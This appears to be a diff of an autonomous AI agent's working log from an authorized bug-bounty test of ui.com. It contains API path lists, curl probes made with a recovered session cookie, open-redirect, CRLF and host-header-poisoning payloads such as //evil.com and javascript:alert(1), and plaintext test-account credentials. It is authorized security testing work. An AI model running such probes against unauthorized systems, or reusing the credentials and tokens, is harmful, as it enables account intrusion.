+archivedDeviceBackups: /ucore/archived-backups
+applicationDevices: /devices/{deviceId}/application-devices
+=== paths block (1 keys) ===
+subscriptions: /api/v1/users/integrations/ssoa/subscriptions
+=== paths block (1 keys) ===
+devices: /api/v1/devices/integrations/ssoa
+=== paths block (4 keys) ===
+subscriptions: /api/v1/subscriptions
+mspSubscriptions: /api/v1/msps/subscriptions
+plans: /api/v2/products/plans
+licenseCode: /api/v1/licenseCodes/validation
+=== paths block (6 keys) ===
+availability: /v1/users/self/subscription-availability
+plans: /v1/users/self/subscription-plans
+storageRegions: /v1/users/self/storage-regions
+subscriptions: /v1/users/self/subscriptions
+settings: /v1/users/self/settings
+usage: /v1/users/self/usage
+=== paths block (2 keys) ===
+cancelSubscription: /api/v2/subscribe
+transferSubscription: /api/v2/subscriptions/{stripeSubscriptionId}/transfer
+=== paths block (11 keys) ===
+zendeskUser: zendesk/user
+zendeskCreateTicket: zendesk/ticket
+zendeskOpenTickets: zendesk/tickets
+zendeskClosedTickets: zendesk/tickets/closed
+zendeskCcdTickets: zendesk/tickets/ccd
+zendeskSearchTickets: zendesk/search_tickets
+zendeskSearchCcdTickets: zendesk/search_ccd
+zendeskComments: zendesk/comments
+zendeskCreateComment: zendesk/comment
+zendeskMarkTicketAsClosed: zendesk/ticket/{ticketId}/close
+chatMessagingJwt: chat/messaging/jwt
+=== paths block (45 keys) ===
+legal: /api/sso/v1/legal
+loginUserCheck: /api/sso/v1/login/email
+idpLoginResult: /api/sso/v1/idp/login-result
+login: /api/sso/v1/login
+shopify_login: /api/sso/v1/shopify_login
+logout: /api/sso/v1/logout
+loginMFA: /api/sso/v1/login/2fa
+self: /api/sso/v1/user/self
+selfSettings: /api/sso/v1/user/self/settings
+twoFa: /api/sso/v1/user/self/2fa
+twoFaBackup: /api/sso/v1/user/self/2fa/backup
+twoFaReset: /api/sso/v1/user/self/2fa/reset
+roles: /api/sso/v1/user/self/roles
+rolesBeta: /api/sso/v1/user/{uuid}/roles/beta
+resetPassword: /api/sso/v1/password
+verifyResetRequest: /api/sso/v1/verify/password
+verifyRegistration: /api/sso/v1/verify/verification-code
+resendVerificationEmail: /api/sso/v1/verify
+createAccount: /api/sso/v2/users
+picture: /api/sso/v1/user/self/picture
+checkUsername: /api/sso/v1/search/username
+checkEmail: /api/sso/v1/search/email
+checkPassword: /api/sso/v2/password-strength
+checkPasswordV1: /api/sso/v1/password-strength
+setupLoginToken: api/sso/v1/user/self/token/setup
+approveLoginToken: api/sso/v1/user/self/token/login
+mfa: /api/sso/v1/user/self/mfa
+sendEmailV2: /api/sso/v2/user/self/mfa/email/{id}/send
+assuranceLevel: /api/sso/v1/user/self/login/level
+assuranceLevelRefresh: /api/sso/v1/user/self/login/level/refresh
+addresses: /api/sso/v1/user/self/addresses
+activity: /api/sso/v1/user/self/activity
+requestVerifyEmail: /api/sso/v1/user/self/email/verify/send
+validateAddress: /api/sso/v1/address/validator
+sessions: /api/sso/v1/user/self/sessions
+zendeskCreateOrUpdateUser: /api/sso/v1/user/self/zendesk_user
+trustedDevices: /api/sso/v1/user/self/trusted_devices
+device: /api/sso/v1/user/self/device
+emailOtp: /api/sso/v1/legacy/user/self/email/send
+verifyEmailChangeOtp: /api/sso/v1/legacy/user/self/email
+passwordlessOptions: /api/sso/v1/passwordless/options
+passwordlessLogin: /api/sso/v1/passwordless/login
+suspiciousConfirmInspect: /api/sso/v1/suspicious/confirm/inspect
+suspiciousConfirm: /api/sso/v1/suspicious/confirm
+savedAccounts: /api/sso/v1/account-chooser
+=== paths block (15 keys) ===
+msp: /api/fabrics/base/msp/v1/msp
+mspIdpEnforcement: /api/fabrics/base/msp/v1/msp/idp-enforcement
+logo: /api/fabrics/base/msp/v1/logo
+idp: /api/fabrics/base/msp/v1/idp
+idpConfiguration: /api/fabrics/base/msp/v1/idp/configuration
+idpCredentials: /api/fabrics/base/msp/v1/idp/credentials
+idpRebind: /api/fabrics/base/msp/v1/idp/rebind
+idpRetryConfigure: /api/fabrics/base/msp/v1/idp/retry-configure
+idpSync: /api/fabrics/base/msp/v1/idp/sync
+idpSyncJob: /api/fabrics/base/msp/v1/idp/sync-jobs/{jobId}
+idpSyncTargets: /api/fabrics/base/msp/v1/idp/sync-targets
+idpDirectoryGroups: /api/fabrics/base/msp/v2/idp/directory/groups
+idpDomainVerify: /api/fabrics/base/msp/v1/idp/domain/verify
+idpScimToken: /api/fabrics/base/msp/v1/idp/scim-token
+idpScimTokenRegenerate: /api/fabrics/base/msp/v1/idp/scim-token/regenerate
+=== paths block (20 keys) ===
+subscriptionsSingle: /api/v2/subscriptions
+customer: /api/v2/customers/self
+cards: /api/v2/customers/self/payment-methods/cards
+paymentMethodsTapPay: /api/v2/customers/self/payment-methods/tappay
+paymentMethods: /api/v2/customers/self/payment-methods
+subscriptions: /api/v2/customers/self/subscriptions
+products: /api/v2/products
+invoices: /api/v2/customers/self/invoices
+invoiceLines: /api/v2/invoices/{invoiceId}/lines
+invoicesUpcoming: /api/v2/customers/self/invoices/preview
+invoicePay: /api/v2/invoices/{invoiceId}/pay
+taxId: /api/v2/customers/self/tax-ids
+uiTaxId: /api/v2/accounts/tax-ids
+businessProfile: /api/v2/accounts/business-profile
+invoiceYears: /api/v2/customers/self/invoices/available-years
+billingDetails: /api/v2/customers/self/billing-details
+pdf: /api/v2/customers/self/invoices/{invoiceId}/pdf
+setupIntents: /api/v2/customers/self/setup-intents
+attachPm: /api/v2/customers/self/setup-intents/{setiId}/attach-pm
+upcomingPDF: /api/v2/customers/self/invoices/upcoming/pdf
+=== paths block (4 keys) ===
+listOrgs: /api/v1/organizations
+subscriptions: /api/v1/organizations/{orgId}/billing/v2/customers/self/subscriptions
+invoices: /api/v1/organizations/{orgId}/billing/v2/customers/self/invoices
+invoiceYears: /api/v1/organizations/{orgId}/billing/v2/customers/self/invoices/available-years
+=== paths block (4 keys) ===
+esimPlans: /api/v1/esim/plans
+esimDevices: /api/v1/esim/devices
+esimOrders: /api/v1/esim/orders
+esimRenewals: /api/v1/esim/renewals
+=== paths block (3 keys) ===
+active: /api/v2/scheduled-maintenances/active.json
+upcoming: /api/v2/scheduled-maintenances/upcoming.json
+incidents: /api/v2/incidents/unresolved.json
+=== paths block (8 keys) ===
+auth: /create-credentials
+backup: /ucore/backup
+devices: /devices
+hosts: /api/v1/hosts
+sites: /sites
+deviceBackups: /ucore/backups
+archivedDeviceBackups: /ucore/archived-backups
+applicationDevices: /devices/{deviceId}/application-devices
+=== paths block (1 keys) ===
+subscriptions: /api/v1/users/integrations/ssoa/subscriptions
+=== paths block (1 keys) ===
+devices: /api/v1/devices/integrations/ssoa
+=== paths block (4 keys) ===
+subscriptions: /api/v1/subscriptions
+mspSubscriptions: /api/v1/msps/subscriptions
+plans: /api/v2/products/plans
+licenseCode: /api/v1/licenseCodes/validation
+=== paths block (6 keys) ===
+availability: /v1/users/self/subscription-availability
+plans: /v1/users/self/subscription-plans
+storageRegions: /v1/users/self/storage-regions
+subscriptions: /v1/users/self/subscriptions
+settings: /v1/users/self/settings
+usage: /v1/users/self/usage
+=== paths block (2 keys) ===
+cancelSubscription: /api/v2/subscribe
+transferSubscription: /api/v2/subscriptions/{stripeSubscriptionId}/transfer
+[0m
+The path config is fully mapped. Let me test a business-logic case not previously covered: username uniqueness/change via the L2 profile update (with restore afterward).
+[0m$ [0mcd /tmp
+TOK=$(cat /tmp/A_token.txt); UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
+H=(-A "$UA" -H "Cookie: UBIC_AUTH=$TOK" -H "Content-Type: application/json")
+echo "=== baseline ==="; curl -s "${H[@]}" https://sso.ui.com/api/sso/v1/user/self -o /tmp/base.json -w "%{http_code}\n"; python3 -c "import json;d=json.load(open('/tmp/base.json'));print({k:d.get(k) for k in ['uuid','username','email','first_name','last_name','is_verified']})"
+R="oc27tmp$((RANDOM))"
+echo "=== change username to $R ==="
+curl -s -o /tmp/p1 -w "PUT %{http_code}\n" -X PUT "${H[@]}" -d "{\"username\":\"$R\"}" https://sso.ui.com/api/sso/v1/user/self; head -c 200 /tmp/p1; echo
+curl -s "${H[@]}" https://sso.ui.com/api/sso/v1/user/self -o /tmp/a1.json; python3 -c "import json;d=json.load(open('/tmp/a1.json'));print('now username=',d.get('username'))"
+echo "=== restore ==="
+curl -s -o /tmp/p2 -w "PUT %{http_code}\n" -X PUT "${H[@]}" -d '{"username":"testttt12"}' https://sso.ui.com/api/sso/v1/user/self; head -c 200 /tmp/p2; echo
+curl -s "${H[@]}" https://sso.ui.com/api/sso/v1/user/self -o /tmp/a2.json; python3 -c "import json;d=json.load(open('/tmp/a2.json'));print('restored username=',d.get('username'))"
+=== baseline ===
+200
+{'uuid': 'd8946fad-2b8e-4cf0-82c5-5d955b57b829', 'username': 'testttt12', 'email': 'tan.tiger5564@maildrop.cc', 'first_name': 'OpenCodeTest', 'last_name': None, 'is_verified': True}
+=== change username to oc27tmp832 ===
+PUT 499
+{"error":"L2_REQUIRED","detail":"Please re-authenticate with your password","ERRCODE":"L2_REQUIRED"}
+now username= testttt12
+=== restore ===
+PUT 499
+{"error":"L2_REQUIRED","detail":"Please re-authenticate with your password","ERRCODE":"L2_REQUIRED"}
+restored username= testttt12
+[0m
+## Objective
+- Follow `skills/AGENT.md` exactly: autonomously hunt valid, reproducible, high-impact bugs in the authorized `ui.com` scope and record findings in `result/`.
+- Continue the existing multi-session run (now Session 27, `decision=preserved`) by testing untested UI routes/API endpoints one-by-one and maintaining progress docs.
+
+## Important Details
+- Scope (per prior `result/scope.md`/`out-of-scope.txt`): `ui.com`, `www.ui.com`, `account.ui.com`, `sso.ui.com`, `account.svc.ui.com`, `cloudaccess.svc.ui.com`. Other `*.svc.ui.com`, `*.store.ui.com`, non-`ui.com` domains, and 3rd-party CDNs are out of scope (record only).
+- Test accounts in `creds/test-account.txt`: A `tan.tiger5564@maildrop.cc`, B `overrated.chinchilla337@maildrop.cc`, password `Acd3423@#345`; login target `https://account.ui.com/login`. Phone device avoids CAPTCHA.
+- `data/targets.txt` sha256 `3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a` matches `result/logs/targets.sha256`.
+- Tools available: opencode, curl, git, node 22.23.5, npx, python3, jq; Chrome DevTools MCP reachable (`chrome-devtools_list_pages` -> about:blank).
+- AGENT.md §9 excludes account-existence oracles, metadata disclosure, logout/DoS, accepted-but-inert fields from `result/confirmed-vuln.txt`.
+- Valid test session A recovered to `/tmp/A_token.txt` (JWT, UUID `d8946fad-2b8e-4cf0-82c5-5d955b57b829`, is_verified true, twofa_enabled true, last_login 2026-11-23). `sso.ui.com/api/sso/v1/user/self` returns 200 with it.
+- Naming/identifiers: `UBIC_AUTH` cookie (HttpOnly, `.ui.com`, SameSite=Lax). CloudFront fronts `sso.ui.com` and wildcard `*.ui.com`.
+- Only change vs prior sessions: `www.ui.com` new deployment `dpl=6f710854cbbfd59f08058493f6937313e2161848` (was `ebfbbf36...`), Next.js `16.4.6` + Turbopack; `account.ui.com` bundle unchanged (`/assets/index-DUlTrD1u.js`, sha256 `a26e5447814525949b83fe3e5b39dde4d2145fddfad86f6fd96596782b680f5c`); Site Manager SPA unchanged (`main-0.2678141fb293ea0d.js`). No prior run_id known for this session yet (date 2026-11-24T09:37:52Z).
+- Next.js 16.4.6 is patched for July 2026 CVEs (fix in 16.2.11+; 16.4.5+ for Nov release) — no applicable known CVE.
+
+## Work State
+### Completed
+- Read `skills/AGENT.md`, `skills/client-side-skill.md`, `skills/server-side-skill.md`; read `data/targets.txt`, `creds/*`, `result/SUMMARY.md`, `result/progress.md`, `result/inventory/routes.md`, `result/inventory/endpoints.md`, `result/unresolved.md`, `result/out-of-scope.txt`.
+- Appended Session 27 header to `result/logs/session.md`.
+- Downloaded new www build chunks to `/tmp/www27/` (36 initial + 6 lazy) and audited: `dangerouslySetInnerHTML` sites are static/i18n (no user source); only query param `appview`; no usable Server Actions (only RSC runtime `createServerReference`); `/download/software/<slug>` injection is percent-encoded into RSC payload, not executable; link allowlist `u` is strict (decode, `https:` only, hostname exact-match in `["dl.ubnt.com","dl.ui.com","fw-download.ubnt.com"]`).
+- Negative: cache deception on `sso` `/api/sso/v1/user/self{,.css,...}` → 404 or `cache-control: private, no-cache`, `vary: Cookie`; no caching.
+- Negative: CRLF/Location injection on `sso` `jwt/token?redirect=` (404) and `zendesk_login?return_to=` (CRLF percent-encoded into Zendesk `return_to` param, no header injection); `shopify_login?redirect=//evil.com` → fixed `us.shop.ui.com` multipass URL.
+- Negative: open-redirect probes on new www (`?s=`,`?l=`,`?redirect=`,`?next=`,`?link=`) → 200, no Location.
+- Confirmed: wildcard `*.ui.com` CloudFront Function 302s to `https://account.ui.com/login?redirect=<https%3A%2F%2F<host>%2F<path>%3F<query>>`; reflects only real `*.ui.com` Host (`evil.ui.com` OK; `evil.com`, `unifi.ui.com.evil.com`, `@`-trick rejected → 403), ignores `X-Forwarded-Host`/`X-Host`/`Forwarded`. Not external open redirect.
+- Confirmed: `account.ui.com` `innerRedirect` validator `IS` requires single leading `/`, rejects `//`, backslash, non-allowlisted path; `NS` (redirect) previously validated elsewhere.
+- Negative: host-header poisoning on new www (`X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Host`, `Forwarded`) → 200, `x-nextjs-cache: HIT`, `og:url` stays `https://ui.com/`, `evil.com` not in body.
+
+### Active
+- Hunting for a genuinely new/high-impact issue; www Next.js rebuild appears clean (patched, no new dynamic sinks); account bundle + Site Manager unchanged.
+- Key unresolved primitive: credentialed CORS reflection on `sso.ui.com`/`cloudaccess.svc.ui.com` still blocked by lack of any attacker-controlled `*.ui.com` origin (see `result/findings/cors-credentialed-reflection.md`).
+- Considering next untested areas: `POST /api/sso/v1/user/self/token/setup` / `token/login` (device-code flow, rate-limit/info-leak), HTTP smuggling/cache poisoning on `sso`, broader dangling-CNAME takeover recon.
+
+### Blocked
+- CORS/clickjacking weaponization: needs attacker-controlled `*.ui.com` content (wildcard serves fixed SPA; no dangling CNAME found across prior recon).
+- Many routes blocked by missing external state: billing customer/org, emailed tokens (reset/verify/email-change/suspicious-confirm), passkey/attestation, CAPTCHA (`/reset-password`, `/register`).
+
+## Next Move
+1. Probe `POST https://sso.ui.com/api/sso/v1/user/self/token/setup` (and `/token/login`) with A cookie and random token; observe status/body and a few-request rate-limit behavior (no brute force).
+2. If no finding, document Session 27 negative results in `result/progress.md`, `result/SUMMARY.md`, `result/inventory/routes.md` (note www `dpl=6f710854...`/Next 16.4.6) and ensure `result/confirmed-vuln.txt` stays free of speculative entries.
+
+## Relevant Files
+- `skills/AGENT.md`: authoritative workflow/rules (§2 scope, §9 confirmed-vuln format, Discord notify on confirmed high-impact).
+- `skills/client-side-skill.md`, `skills/server-side-skill.md`: testing methodology per route.
+- `data/targets.txt`: scope (`ui.com`, UI-route discovery + one-by-one testing instructions).
+- `creds/test-account.txt`: test accounts A/B and login URL.
+- `result/progress.md`: route testing progress (37 account routes, 22 fully tested, 15 blocked).
+- `result/SUMMARY.md`: multi-session summary; confirmed low/informational findings 001-004, unresolved CORS.
+- `result/inventory/routes.md`, `result/inventory/endpoints.md`: route + endpoint ledgers.
+- `result/unresolved.md`: CORS subdomain-origin blocker and other open items.
+- `result/out-of-scope.txt`: explicit out-of-scope asset list (svc hosts, store, ubnt, etc.).
+- `result/scope.md`: scope restatement/in-scope components.
+- `result/confirmed-vuln.txt`: confirmed-only ledger (currently empty).
+- `result/findings/cors-credentialed-reflection.md`: credentialed CORS detail.
+- `result/logs/session.md`: Session 27 header appended.
+- `result/logs/opencode.log`: source of recovered `UBIC_AUTH` tokens (binary; use `grep -a`).
+- `/tmp/A_token.txt`: valid Account A JWT for authenticated tests.
+- `/tmp/acct27/app.js`: current account bundle (`index-DUlTrD1u.js`).
+- `/tmp/www27/`, `/tmp/www27b/`: new www build chunks for auditing.
+- `vulnebleti/` (`cache/`, `http_request_smuggling/`, `cspt/`, `ATO/`, etc.): technique references.
+Continue if you have next steps, or stop and ask for clarification if you are unsure how to proceed.
+Username change requires fresh L2 re-auth (499), so that path is gated. Let me run the planned device-token probe with invalid bodies (no state change), then close out the session docs.
+[0m$ [0mcd /tmp
+TOK=$(cat /tmp/A_token.txt); UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
+H=(-A "$UA" -H "Cookie: UBIC_AUTH=$TOK" -H "Content-Type: application/json")
+for p in setup login; do
+  echo "=== POST token/$p {} ==="
+  curl -s -D /tmp/h_$p -o /tmp/b_$p -w "status %{http_code}\n" -X POST "${H[@]}" -d '{}' "https://sso.ui.com/api/sso/v1/user/self/token/$p"
+  grep -iE 'retry-after|ratelimit|x-rate|cache-control' /tmp/h_$p | head; head -c 240 /tmp/b_$p; echo
+done
+echo "=== POST token/setup {name} unauth (no cookie) ==="
+curl -s -o /tmp/b_u -w "status %{http_code}\n" -A "$UA" -H "Content-Type: application/json" -d '{"name":"x"}' "https://sso.ui.com/api/sso/v1/user/self/token/setup"; head -c 240 /tmp/b_u; echo
+echo "=== OPTIONS ==="
+curl -s -o /dev/null -D - -X OPTIONS -A "$UA" -H "Origin: https://account.ui.com" -H "Access-Control-Request-Method: POST" "https://sso.ui.com/api/sso/v1/user/self/token/setup" | grep -iE '^HTTP|access-control|cache-control'
+=== POST token/setup {} ===
+status 400
+cache-control: private, max-age=0, no-cache
+{"token":["This field is required."],"error":"VALIDATION_ERROR"}
+=== POST token/login {} ===
+status 400
+cache-control: private, max-age=0, no-cache
+{"token":["This field is required."],"error":"VALIDATION_ERROR"}
+=== POST token/setup {name} unauth (no cookie) ===
+status 401
+ is not allowed
+=== OPTIONS ===
+HTTP/2 200 
+access-control-allow-credentials: true
+access-control-allow-origin: https://account.ui.com
+access-control-allow-methods: POST,GET,HEAD,PATCH,DELETE,OPTIONS,PUT
+vary: Access-Control-Request-Method
+vary: Access-Control-Request-Headers
+access-control-max-age: 600
+[0m
+[0m$ [0mcd /tmp
+TOK=$(cat /tmp/A_token.txt); UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
+H=(-A "$UA" -H "Cookie: UBIC_AUTH=$TOK" -H "Content-Type: application/json")
+for i in 1 2; do
+  for p in setup login; do
+    t="AAAA-BBBB-$i$RANDOM"
+    echo -n "token/$p '$t' -> "
+    curl -s -D /tmp/hh -o /tmp/bb -w "%{http_code} " -X POST "${H[@]}" -d "{\"token\":\"$t\"}" "https://sso.ui.com/api/sso/v1/user/self/token/$p"
+    grep -iE 'retry-after|x-rate|ratelimit' /tmp/hh | tr '\n' ' '; head -c 160 /tmp/bb; echo
+  done
+done
+echo "--- unauth token/login ---"
+curl -s -o /tmp/bu -w "%{http_code} " -A "$UA" -H "Content-Type: application/json" -d '{"token":"AAAA-BBBB"}' "https://sso.ui.com/api/sso/v1/user/self/token/login"; head -c 200 /tmp/bu; echo
+token/setup 'AAAA-BBBB-122654' -> 404 
+token/login 'AAAA-BBBB-14288' -> 404 
+token/setup 'AAAA-BBBB-219640' -> 404 
+token/login 'AAAA-BBBB-219171' -> 404 
+--- unauth token/login ---
+401  is not allowed
+[0m
+Negative: unknown device tokens return generic 404 with no rate-limit headers and no valid/invalid oracle. This closes the planned probe. Let me append the Session 27 findings to the result docs.
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+echo "===== session.md tail ====="; tail -n 30 result/logs/session.md
+echo "===== progress.md tail ====="; tail -n 25 result/progress.md
+echo "===== SUMMARY.md tail ====="; tail -n 30 result/SUMMARY.md
+===== session.md tail =====
+- Recon: 94 ui.com hosts resolved (no dangling CNAME); blog/community/design/mobility/help NOT in approved list -> observed only, recorded out-of-scope; no attacker-controlled *.ui.com origin.
+- www middleware/cookie/XFH probes inert (200, /us/en rewrite, cookies reset; // paths 404).
+- No new high-impact finding; confirmed-vuln.txt unchanged; no Discord notification.
+- Ledger: result/server-side/account.ui.com/session25-ledger.md
+== session end 2026-11-23T08:05:00Z ==
+
+## Session 26 (2026-11-23T23:44Z UTC) — continuation (run 45291357082, decision=preserved)
+- Working dir: repo root. Target hash 3353d9c6… matches; continuation (not reset).
+- Agent/model: opencode / deepseek-v4.1-flash-free. Env: GitHub Actions Linux runner.
+- Tools: opencode, curl, git, node 22.23.5, npx, python3, jq, google-chrome-stable present.
+- Prior state: 47 routes (32 done / 15 blocked), no high-impact confirmed; confirmed-vuln.txt empty.
+- Plan: verify MCP; recover A/B sessions; hunt remaining in-scope surface (account.svc/sso/cloudaccess);
+  avoid duplicates per testing-inventory.json.
+
+### Session 26 outcome (2026-11-23T23:5xZ)
+- Builds unchanged; A/B sessions validated; A escalated to L2.
+- New checks: password-strength (inert), email header-injection (blocked), bounded SSO
+  discovery (all 404), www Next probes (no optimizer; /api -> store out of scope),
+  runtime redirect checks (no open redirect / no javascript: exec), account-frame
+  postMessage bridge re-audit (Not Vulnerable), Site Manager unaudited chunks (no exploit).
+- No new confirmed high-impact finding; confirmed-vuln.txt unchanged; no Discord notification.
+- Ledger: result/server-side/account.ui.com/session26-ledger.md
+== session end 2026-11-23T23:58:00Z ==
+
+## Session 27 — 2026-11-24T09:37Z (continuation, decision=preserved)
+- Start: 2026-11-24T09:37:52Z
+- Target: ui.com (domain-only); in-scope components: www/account/sso + observed svc hosts per scope.md
+- Agent/model: opencode / deepseek-v4.1-flash-free
+- Tools: opencode, curl, git, node 22.23.5, npx, python3, jq; Chrome DevTools MCP available (about:blank)
+- Mode: continuation of Session 26; reading preserved inventory/findings first.
+===== progress.md tail =====
+  `confirmed-vuln.txt` unchanged; no Discord notification.
+- Ledger: `result/server-side/account.ui.com/session25-ledger.md`.
+
+## Session 26 (2026-11-23T23:44Z) — new coverage, no route-status change
+- Builds unchanged: account `index-DUlTrD1u.js` sha256 `a26e5447...`; Site Manager
+  `main-0.2678141...`/`main-7.89817...` (Session 16); www Next.js unchanged.
+- Recovered/validated A+B sessions; A escalated to L2 (password) for email-flow tests.
+- New negatives: `POST /api/sso/v1/password-strength` (v1) is zxcvbn-only; v2 returns policy
+  requirements; no reflection. `email/verify/send` rejects CRLF (parse + email validation),
+  uniqueness is case-insensitive; no header injection / ATO. A's email unchanged.
+- Bounded GET-only SSO discovery (20 candidate paths) -> all `404`; no hidden endpoints.
+- www Next: no `/_next/image`; `/api/*` 301 -> `store.ui.com` (out of scope).
+- Runtime (Chrome MCP): `login?redirect=https://evil.com|//evil.com|javascript:alert(1)`
+  do NOT redirect/execute; `www.ui.com/download/unifi` renders normally.
+- Client-side `account-frame`/postMessage bridge re-analysed: `Rw()` posts PII only to
+  `kw()`-validated parent (https + ui.com/ubnt.com/uisp.com); `Gge()='*'` only in non-prod;
+  inbound Megaphone requires `source===parent` + `kw(origin)`; popup result uses self
+  targetOrigin. Not Vulnerable (documents a previously unsummarised mechanism).
+- Site Manager unaudited chunks: BroadcastChannel user-sync is same-origin; invite role
+  forward is existing VULN-20261114-001 (still Unresolved, no invitation); SW fetch proxy is
+  SW-scoped. No new exploit.
+- Status: 47 routes unchanged (32 done / 15 blocked). No new high-impact finding;
+  `confirmed-vuln.txt` unchanged; no Discord notification.
+- Ledger: `result/server-side/account.ui.com/session26-ledger.md`;
+  evidence `result/server-side/account.ui.com/traffic/session26-newcover.txt`.
+===== SUMMARY.md tail =====
+- No new high-impact finding; `confirmed-vuln.txt` unchanged; no Discord notification.
+  Ledger: `result/server-side/account.ui.com/session25-ledger.md`.
+
+## Session 26 (2026-11-23T23:44Z, run 45291357082; continuation, decision=preserved)
+- Builds unchanged (`account.ui.com` `index-DUlTrD1u.js` sha256 `a26e5447...`;
+  Site Manager `main-0.2678141`/`main-7.89817` unchanged since Session 16; www Next.js
+  unchanged). No new JavaScript to diff.
+- Recovered and validated A/B full sessions from `result/logs/opencode.log`; escalated A
+  to L2 (password re-auth) for the email-change flow.
+- **New negatives (no impact):** `POST /api/sso/v1/password-strength` is zxcvbn-only;
+  `POST /api/sso/v2/password-strength` returns policy requirements — no reflection.
+  `POST /user/self/email/verify/send` rejects CRLF (JSON parse error / invalid email) and
+  enforces case-insensitive uniqueness — no header injection or ATO; A's email unchanged.
+  Bounded GET-only SSO discovery (20 plausible paths) all `404` (no hidden endpoints).
+  `www.ui.com` has no `/_next/image`; `/api/*` 301s to `store.ui.com` (out of scope).
+- **Runtime (Chrome DevTools MCP):** `account.ui.com/login?redirect=` with
+  `https://evil.com`, `//evil.com`, `javascript:alert(1)` does **not** redirect or execute
+  (final URL stays on account.ui.com); `www.ui.com/download/unifi` renders normally.
+- **Client-side bridge re-analysis (new documentation):** the `account-frame`/`window.name`
+  + `Rw()`/`Gge()`/`Wge()`/`kw()` bridge posts PII (`sso.account.changed`) only to a
+  `kw()`-validated parent (https + host last-two-labels ∈ ui.com/ubnt.com/uisp.com);
+  `Gge()` returns `'*'` only in non-`prd` builds. Inbound Megaphone listener requires
+  `event.source===window.parent` and `kw(event.origin)` + Zod schema. Popup SSO result
+  posts with `targetOrigin = window.location.origin`. => Not Vulnerable.
+- **Site Manager unaudited chunks (main-2..6, numeric):** user-sync `BroadcastChannel` is
+  same-origin only; invite `role` forward is the known VULN-20261114-001 (Unresolved, still
+  no valid invitation); service-worker fetch proxy is same-origin SW-scoped. No new exploit.
+- Route ledger unchanged: 47 routes (32 done / 15 blocked). No new confirmed high-impact
+  finding; `confirmed-vuln.txt` unchanged; no Discord notification. Ledger:
+  `result/server-side/account.ui.com/session26-ledger.md`.
+[0m
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+ls -la result/server-side/account.ui.com/ 2>/dev/null | tail -n 20; echo "---"; ls result/server-side/account.ui.com/traffic/ 2>/dev/null | tail -n 20
+total 64
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 4 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r-- 1 runner runner 3343 Nov 24 09:36 api-inventory.md
+-rw-r--r-- 1 runner runner 2586 Nov 24 09:36 session10-ledger.md
+-rw-r--r-- 1 runner runner 3808 Nov 24 09:36 session16-ledger.md
+-rw-r--r-- 1 runner runner 3797 Nov 24 09:36 session17-ledger.md
+-rw-r--r-- 1 runner runner 4019 Nov 24 09:36 session18-ledger.md
+-rw-r--r-- 1 runner runner 3601 Nov 24 09:36 session19-ledger.md
+-rw-r--r-- 1 runner runner 5382 Nov 24 09:36 session23-ledger.md
+-rw-r--r-- 1 runner runner 4160 Nov 24 09:36 session24-ledger.md
+-rw-r--r-- 1 runner runner 3511 Nov 24 09:36 session25-ledger.md
+-rw-r--r-- 1 runner runner 6145 Nov 24 09:36 session26-ledger.md
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 traffic
+---
+session16-endpoints.txt
+session16-mass-assignment.txt
+session17-chat-queue.txt
+session18-bundle-diff.txt
+session18-legacy-email.txt
+session19-account-chooser-2fa-reset.txt
+session25-zendesk-login-cors-jsonp.txt
+session26-newcover.txt
+[0m
+[0m→ [0mRead result/server-side/account.ui.com/session26-ledger.md
+[0m
+[0m← [0mWrite result/server-side/account.ui.com/session27-ledger.md
+Wrote file successfully.
+[0m
+[0m← [0mWrite result/server-side/account.ui.com/traffic/session27-www-sso-account.txt
+Wrote file successfully.
+[0m
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+cat >> result/progress.md <<'EOF'
+
+## Session 27 (2026-11-24T09:37Z) — www redeploy audit + device-token endpoints, no status change
+- Builds: `www.ui.com` redeployed `dpl=6f710854cbbfd59f08058493f6937313e2161848`
+  (was `ebfbbf36…`), Next.js `16.4.6` + Turbopack (patched; >=16.2.11/16.4.5).
+  `account.ui.com` `index-DUlTrD1u.js` sha256 `a26e5447…` and Site Manager `main-0.2678141…`
+  unchanged.
+- www chunk audit (36 initial + 6 lazy): `dangerouslySetInnerHTML` static/i18n only; only
+  query param consumed is `appview` (no sink); no usable Server Actions; `/download/software/<slug>`
+  percent-encoded into RSC payload; link `u` allowlist strict (`https:` + hostname ∈
+  dl.ubnt.com/dl.ui.com/fw-download.ubnt.com). Clean.
+- New negatives: `token/setup`+`token/login` require `token` (400); random tokens -> generic
+  `404` with no rate-limit headers and no valid-vs-invalid oracle; unauth -> `401`.
+  `PUT /user/self {username}` -> `499 L2_REQUIRED` (fresh password re-auth needed, not a finding).
+  Cache-deception suffixes -> `404` / `cache-control: private, no-cache`, `vary: Cookie`.
+  www XFH/X-Host/Forwarded poisoning inert (`x-nextjs-cache: HIT`, `og:url` fixed); no
+  open-redirect on `?s/?l/?redirect/?next/?link`; wildcard 302 reflects only real `*.ui.com` Host.
+- CORS primitive still un-weaponizable (no attacker-controlled `*.ui.com` origin).
+- Status: 47 routes unchanged (32 done / 15 blocked). No new high-impact finding;
+  `confirmed-vuln.txt` unchanged; no Discord notification.
+- Ledger: `result/server-side/account.ui.com/session27-ledger.md`;
+  evidence `result/server-side/account.ui.com/traffic/session27-www-sso-account.txt`.
+EOF
+cat >> result/SUMMARY.md <<'EOF'
+
+## Session 27 (2026-11-24T09:37Z; continuation, decision=preserved)
+- `www.ui.com` redeployed `dpl=6f710854cbbfd59f08058493f6937313e2161848` (was `ebfbbf36…`),
+  Next.js `16.4.6` + Turbopack — **patched** (>=16.2.11/16.4.5), no applicable known CVE.
+  `account.ui.com` `index-DUlTrD1u.js` sha256 `a26e5447…` and Site Manager `main-0.2678141…`
+  unchanged (no new account JS to diff).
+- **www chunk audit** (36 initial + 6 lazy): `dangerouslySetInnerHTML` sites static/i18n only;
